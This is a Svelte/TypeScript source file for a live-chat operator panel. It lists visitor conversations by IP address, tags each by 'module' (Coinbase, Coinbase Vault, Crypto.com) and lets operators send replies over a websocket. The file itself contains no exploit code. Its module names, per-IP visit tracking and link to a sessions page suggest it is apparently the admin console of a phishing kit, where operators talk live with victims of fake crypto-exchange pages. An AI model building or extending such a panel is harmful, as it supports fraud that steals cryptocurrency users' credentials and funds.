<script lang="ts">
	import { onMount, tick } from 'svelte';
	import { page } from '$app/stores';
	import {
		MessageSquare,
		Search,
		Send,
		Filter,
		Circle,
		User,
		Clock,
		RefreshCw
	} from 'lucide-svelte';
	import { connected, sendMessage, livechatEvent } from '$lib/stores/websocket';
	import ConnectionBadge from '$lib/components/ConnectionBadge.svelte';
	import { timeAgo } from '$lib/utils/time';
	import { toast } from '$lib/stores/toast';

	function wsSend(type: string, payload: unknown) {
		if (!sendMessage(type, payload)) {
			toast.error('Not connected to server');
			return false;
		}
		return true;
	}

	interface Conversation {
		id: string;
		visitorIp: string;
		module: string;
		visitCount: number;
		lastMessageAt: number;
		lastMessagePreview: string;
		createdAt: number;
		active: boolean;
		unread: number;
	}
	interface Message {
		id: string;
		sender: 'visitor' | 'operator';
		authorName: string;
		body: string;
		seen: boolean;
		createdAt: number;
	}

	let conversations: Conversation[] = $state([]);
	let messages: Message[] = $state([]);
	let selectedIp = $state('');
	let search = $state('');
	let filter = $state<'all' | 'active' | 'Coinbase' | 'Coinbase Vault' | 'Crypto.com'>('all');
	let composeText = $state('');
	let messagesScrollEl: HTMLDivElement | null = $state(null);
	let pollTimer: ReturnType<typeof setInterval> | null = null;

	let filtered = $derived(
		conversations.filter((c) => {
			if (filter === 'active' && !c.active) return false;
			if (filter !== 'all' && filter !== 'active' && c.module !== filter) return false;
			if (search.trim()) {
				const q = search.toLowerCase();
				return (
					c.visitorIp.toLowerCase().includes(q) ||
					c.lastMessagePreview.toLowerCase().includes(q) ||
					c.module.toLowerCase().includes(q)
				);
			}
			return true;
		})
	);

	async function fetchConversations() {
		const params = new URLSearchParams();
		if (filter === 'active') params.set('status', 'active');
		const res = await fetch(`/api/livechat/conversations?${params}`);
		if (res.ok) {
			const data = await res.json();
			conversations = data.conversations;
			if (!selectedIp && conversations.length > 0) selectedIp = conversations[0].visitorIp;
		}
	}

	async function fetchMessages(ip: string, markRead = true) {
		if (!ip) {
			messages = [];
			return;
		}
		const url = `/api/livechat/conversations/${encodeURIComponent(ip)}/messages${markRead ? '?markRead=true' : ''}`;
		const res = await fetch(url);
		if (res.ok) {
			const data = await res.json();
			messages = data.messages;
			await tick();
			scrollToBottom();
			if (markRead) sendMessage('livechat:operator:read', { ip });
		}
	}

	function scrollToBottom() {
		if (messagesScrollEl) messagesScrollEl.scrollTop = messagesScrollEl.scrollHeight;
	}

	$effect(() => {
		if (selectedIp) fetchMessages(selectedIp);
	});

	// React to incoming livechat events
	$effect(() => {
		const evt = $livechatEvent;
		if (!evt) return;
		// Refresh conversation list (last preview / unread change)
		fetchConversations();
		if (evt.visitorIp === selectedIp && evt.type === 'msg:new' && evt.message) {
			messages = [...messages, evt.message];
			tick().then(scrollToBottom);
			if (evt.message.sender === 'visitor') {
				sendMessage('livechat:operator:read', { ip: selectedIp });
			}
		}
	});

	onMount(() => {
		const initialIp = $page.url.searchParams.get('ip');
		if (initialIp) selectedIp = initialIp;
		fetchConversations();
		pollTimer = setInterval(() => {
			if (!$connected) {
				fetchConversations();
				if (selectedIp) fetchMessages(selectedIp, false);
			}
		}, 6000);
		return () => {
			if (pollTimer) clearInterval(pollTimer);
		};
	});

	function send() {
		const text = composeText.trim();
		if (!text || !selectedIp) return;
		if (!wsSend('livechat:operator:send', { ip: selectedIp, body: text })) return;
		composeText = '';
	}

	function onKey(e: KeyboardEvent) {
		if (e.key === 'Enter' && !e.shiftKey) {
			e.preventDefault();
			send();
		}
	}

	function moduleColor(m: string): string {
		const lc = (m || '').toLowerCase();
		if (lc.includes('vault')) return 'bg-purple-500/15 text-purple-300';
		if (lc.includes('coinbase')) return 'bg-blue-500/15 text-blue-300';
		if (lc.includes('crypto')) return 'bg-cyan-500/15 text-cyan-300';
		return 'bg-[var(--accent)]/30 text-[var(--muted-foreground)]';
	}

	function truncIp(ip: string): string {
		if (ip.length <= 30) return ip;
		return ip.slice(0, 18) + '...' + ip.slice(-8);
	}

	let selectedConv = $derived(conversations.find((c) => c.visitorIp === selectedIp));
</script>

<svelte:head>
	<title>Live Chat · Panel</title>
</svelte:head>

<div class="p-8 pt-5">
	<div class="mb-5 flex items-center justify-between">
		<h1 class="text-2xl font-bold text-[var(--foreground)]">Live Chat</h1>
		<div class="flex items-center gap-2">
			<ConnectionBadge />
			<button
				onclick={fetchConversations}
				aria-label="Refresh conversations"
				class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
			>
				<RefreshCw size={12} />
				Refresh
			</button>
		</div>
	</div>

	<div class="grid gap-4 xl:grid-cols-[360px_minmax(0,1fr)]">
		<!-- Conversation list -->
		<aside class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
			<div class="border-b border-[var(--border)] px-4 py-3 space-y-2">
				<div class="relative">
					<Search size={11} class="absolute left-2.5 top-1/2 -translate-y-1/2 text-[var(--text-tertiary)]" />
					<input
						type="text"
						bind:value={search}
						placeholder="Search conversations..."
						class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] py-1.5 pl-7 pr-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"
					/>
				</div>
				<div class="flex flex-wrap gap-1">
					{#each ['all', 'Coinbase', 'Coinbase Vault', 'Crypto.com', 'active'] as f}
						<button
							onclick={() => (filter = f as typeof filter)}
							class="rounded-md px-2 py-1 text-[10px] {filter === f ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]/30'}"
						>
							{f === 'all' ? 'All' : f === 'active' ? 'Active' : f}
						</button>
					{/each}
				</div>
			</div>

			<div class="max-h-[72vh] overflow-y-auto custom-scrollbar">
				{#if filtered.length === 0}
					<p class="py-8 text-center text-xs text-[var(--muted-foreground)]">No conversations</p>
				{:else}
					{#each filtered as c (c.id)}
						<button
							onclick={() => (selectedIp = c.visitorIp)}
							class="w-full border-b border-[var(--border-subtle)] px-4 py-3 text-left transition-soft-no-bg hover:bg-[var(--accent)]/30 last:border-0 {selectedIp === c.visitorIp ? 'bg-[var(--accent-primary)]/10' : ''}"
						>
							<div class="flex items-start gap-3">
								<div class="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[var(--accent-primary)]/15 text-xs font-bold text-[var(--text-accent)]">
									{c.visitCount}
								</div>
								<div class="min-w-0 flex-1">
									<div class="flex items-center gap-1.5">
										<p class="truncate font-mono text-xs font-medium text-[var(--foreground)]">{truncIp(c.visitorIp)}</p>
										{#if c.unread > 0}
											<span class="rounded-full bg-[var(--accent-primary)] px-1.5 py-0.5 text-[9px] font-bold text-white">
												{c.unread}
											</span>
										{/if}
									</div>
									<p class="mt-0.5 truncate text-[11px] text-[var(--muted-foreground)]">
										{c.lastMessagePreview || 'No messages yet'}
									</p>
									<div class="mt-1 flex items-center gap-2 text-[10px] text-[var(--text-tertiary)]">
										<span>{c.lastMessageAt ? timeAgo(c.lastMessageAt) : 'just now'}</span>
										{#if c.module}
											<span class="rounded px-1.5 py-0.5 {moduleColor(c.module)}">{c.module}</span>
										{/if}
									</div>
								</div>
							</div>
						</button>
					{/each}
				{/if}
			</div>
		</aside>

		<!-- Chat thread -->
		<section class="flex h-[78vh] flex-col rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden">
			{#if !selectedConv}
				<div class="flex flex-1 flex-col items-center justify-center gap-2 text-center">
					<MessageSquare size={36} class="text-[var(--text-tertiary)]" />
					<p class="text-sm font-semibold text-[var(--foreground)]">No conversation selected</p>
					<p class="text-xs text-[var(--muted-foreground)]">Select a conversation to start chatting</p>
				</div>
			{:else}
				<header class="flex items-center justify-between border-b border-[var(--border)] px-5 py-3">
					<div class="min-w-0">
						<p class="truncate font-mono text-sm font-semibold text-[var(--foreground)]">{selectedConv.visitorIp}</p>
						<div class="mt-0.5 flex items-center gap-2 text-[11px] text-[var(--muted-foreground)]">
							{#if selectedConv.module}
								<span class="rounded px-1.5 py-0.5 {moduleColor(selectedConv.module)}">{selectedConv.module}</span>
							{/if}
							<span>visit #{selectedConv.visitCount}</span>
							<span>·</span>
							<span>since {timeAgo(selectedConv.createdAt)}</span>
						</div>
					</div>
					<a
						href="/sessions?search={encodeURIComponent(selectedConv.visitorIp)}"
						class="flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-1.5 text-[11px] text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]"
					>
						<User size={11} />
						Open in Sessions
					</a>
				</header>

				<div bind:this={messagesScrollEl} class="flex-1 overflow-y-auto custom-scrollbar p-5 space-y-3">
					{#if messages.length === 0}
						<p class="py-12 text-center text-xs text-[var(--muted-foreground)]">No messages yet — say hi!</p>
					{:else}
						{#each messages as m (m.id)}
							<div class="flex {m.sender === 'operator' ? 'justify-end' : 'justify-start'}">
								<div class="max-w-[70%] {m.sender === 'operator' ? 'rounded-2xl rounded-br-sm bg-[var(--accent-primary)] text-white' : 'rounded-2xl rounded-bl-sm border border-[var(--border)] bg-[var(--input)]/50 text-[var(--foreground)]'} px-3.5 py-2">
									<p class="break-words text-sm leading-snug">{m.body}</p>
									<p class="mt-1 flex items-center gap-1.5 text-[10px] {m.sender === 'operator' ? 'text-white/70' : 'text-[var(--muted-foreground)]'}">
										<Clock size={9} />
										{timeAgo(m.createdAt)}
										{#if m.authorName}
											<span>·</span>
											<span>{m.authorName}</span>
										{/if}
									</p>
								</div>
							</div>
						{/each}
					{/if}
				</div>

				<form onsubmit={(e) => { e.preventDefault(); send(); }} class="border-t border-[var(--border)] p-3">
					<div class="flex items-end gap-2">
						<textarea
							bind:value={composeText}
							onkeydown={onKey}
							rows={1}
							placeholder="Type a message... (Enter to send)"
							class="flex-1 resize-y rounded-lg border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-sm text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"
						></textarea>
						<button
							type="submit"
							disabled={!composeText.trim()}
							class="btn-accent flex items-center gap-1.5 rounded-lg px-4 py-2 text-xs disabled:opacity-50 disabled:cursor-not-allowed"
						>
							<Send size={12} />
							Send
						</button>
					</div>
				</form>
			{/if}
		</section>
	</div>
</div>
